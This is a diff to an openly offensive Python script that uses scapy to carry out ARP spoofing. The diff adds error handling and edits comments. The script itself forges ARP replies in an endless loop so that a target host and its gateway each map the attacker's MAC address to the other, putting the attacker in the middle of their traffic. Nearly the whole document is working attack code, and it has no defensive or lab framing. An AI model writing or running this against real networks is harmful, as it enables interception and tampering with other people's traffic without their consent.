@@ -4,20 +4,25 @@ from scapy.all import ARP, Ether, send, srp
 
 # Function to perform ARP spoofing
 def arp_spoof(target_ip, gateway_ip, interface):
-    # Crafting the ARP response packet to trick the target into thinking
-    # this machine's MAC is the gateway's MAC address.
+    # Get MAC addresses for the target and gateway
     target_mac = get_mac(target_ip)
     gateway_mac = get_mac(gateway_ip)
+
+    if not target_mac or not gateway_mac:
+        print("[!] Could not retrieve MAC addresses. Exiting.")
+        return
 
     print(f"[*] Target MAC: {target_mac}")
     print(f"[*] Gateway MAC: {gateway_mac}")
 
     # Infinite loop to send ARP responses
     while True:
-        # Send fake ARP reply (target thinks our MAC is the gateway)
+        # Send fake ARP reply to the target (target thinks our MAC is the gateway)
         send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac), iface=interface, verbose=False)
-        # Send another fake ARP reply to the gateway (gateway thinks our MAC is the target)
+
+        # Send fake ARP reply to the gateway (gateway thinks our MAC is the target)
         send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac), iface=interface, verbose=False)
+
         print(f"[*] Sent ARP spoof to target {target_ip} and gateway {gateway_ip}")
         time.sleep(2)
 
@@ -28,7 +33,7 @@ def get_mac(ip):
     broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast/arp_request
     answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
-    
+
     # Return the MAC address
     if answered_list:
         return answered_list[0][1].hwsrc
